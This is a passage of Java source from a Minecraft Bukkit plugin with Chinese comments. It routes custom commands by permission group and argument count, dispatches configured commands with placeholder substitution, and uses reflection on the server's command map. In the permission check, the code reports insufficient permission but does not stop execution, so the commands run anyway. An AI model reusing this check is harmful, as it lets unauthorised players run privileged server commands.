                                }else{
                                    sb.append("Other.");
                                }


                            }catch (Exception e){
                                getLogger().warning("在获取权限组时出现了异常");
                                getLogger().warning("以Other继续！");
                                sb.append("Other.");
                                e.printStackTrace();
                            }
                        }
                    }

                    //参数个数(显然这个不关玩家事)
                    if (getConfig().getBoolean("CommandAlert.Hard." + s + ".exFunction.ArgAmount", false)) {

                        //获得长度
                        String length = String.valueOf(strings.length);

                        //表项是否存在
                        if(getConfig().isLocation(sb + length)) {
                            sb.append(length).
                                    append(".");
                        }else{
                            sb.append("Other.");
                        }
                    }

                    //自定义参数(显然这个也不关玩家事)
                    //这个就不用添加时判定存不存在了，不存在直接执行不存在的部分
                    if (getConfig().getBoolean("CommandAlert.Hard." + s + ".exFunction.Arg", false)) {
                        for (String c : strings) {
                            sb.append(c).append(".");
                        }
                    }


                    String CommandPath = sb.toString();

                    //输出
                    getLogger().info("CommandPath:" + CommandPath);

                    //判读表项是否存在
                    if(!getConfig().isLocation(CommandPath)) {
                        commandSender.sendMessage("出现了内部异常，指定的数据不存在，请联系管理员解决");
                        return true;
                    }

                    if (!getConfig().getString(CommandPath + ".Arg", "0").equals(String.valueOf(strings.length))) {
                        //参数不足的话
                        commandSender.sendMessage("参数数量不足");
                        return false;
                    }

                    if (!getConfig().getString(CommandPath + ".Permission", "Null").equals("Null")) {
                        if (!commandSender.hasPermission(getConfig().getString(CommandPath + ".Permission", "Null"))) {
                            commandSender.sendMessage("权限不足");
                        }
                    }

                    List<String> ExecuteCommands = getConfig().getStringList(CommandPath + ".Goal");

                    //日志
                    getLogger().info("玩家 " + commandSender.getName() + "使用了命令" + s);

                    //执行
                    if (getConfig().getBoolean(CommandPath + ".Replace", false)) {

                        for (String executeCommand : ExecuteCommands) {

                            //替换参数
                            String Executer = executeCommand;
                            for (int i = 0; i < strings.length; i++) {
                                Executer = Executer.replace("{" + i + "}", strings[i]);
                            }

                            //是否是玩家
                            if (p != null) {
                                Executer = Executer.
                                        replace("{PlayerName}", p.getName()).
                                        replace("{PlayerUUID}", p.getUniqueId().toString()).
                                        replace("{PlayerWorld}", p.getWorld().toString());
                            }

                            //执行命令
                            Bukkit.dispatchCommand(commandSender, Executer);
                        }

                    } else {
                        for (String executeCommand : ExecuteCommands) {
                            //执行命令
                            Bukkit.dispatchCommand(commandSender, executeCommand);
                        }
                    }
                    return true;

                }
            };

            //将Command实例添加到列表
            Commands_PerAdd.add(PerAdd);
        }

        //反射+置命令
        try {
            final Field bukkitCommandMap = Bukkit.getServer().getClass().getDeclaredField("commandMap");

            bukkitCommandMap.setAccessible(true);
            CommandMap commandMap = (CommandMap) bukkitCommandMap.get(Bukkit.getServer());

            commandMap.registerAll("GeyserPermGroup", Commands_PerAdd);
            getLogger().info("载入指令转接补全成功");
        } catch (NoSuchFieldException | IllegalAccessException e) {
            getLogger().warning("载入指令转接补全失败！");
            getLogger().warning("出现了异常");
            e.printStackTrace();
        }
    }

    private static Object getPrivateField(Object object, String field)throws SecurityException,
            NoSuchFieldException, IllegalArgumentException, IllegalAccessException {
        Class<?> clazz = object.getClass();
        Field objectField = clazz.getDeclaredField(field);
        objectField.setAccessible(true);
        Object result = objectField.get(object);
        objectField.setAccessible(false);
        return result;
    }

    public void unRegisterBukkitCommand(PluginCommand cmd) {
        try {
            Object result = getPrivateField(this.getServer().getPluginManager(), "commandMap");
            SimpleCommandMap commandMap = (SimpleCommandMap) result;
            Object map = getPrivateField(commandMap, "knownCommands");
            @SuppressWarnings("unchecked")
            HashMap<String, Command> knownCommands = (HashMap<String, Command>) map;
            knownCommands.remove(cmd.getName());
            for (String alias : cmd.getAliases()){
                if(knownCommands.containsKey(alias) && knownCommands.get(alias).toString().contains(this.getName())){
                    knownCommands.remove(alias);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String GetVersion(Player player){
        if(getConfig().getBoolean("VersionCheck.FloodGate", false)){
            if(FloodgateApi.getInstance().isFloodgatePlayer(player.getUniqueId())){
                return ("Bedrock");
            };
        }

        if(getConfig().getBoolean("VersionCheck.ViaVersion", false)){

            return (String.valueOf(
                    Via.getAPI().getPlayerVersion(player.getUniqueId())
            ));
        };

        return ("Unknow");
    }


}

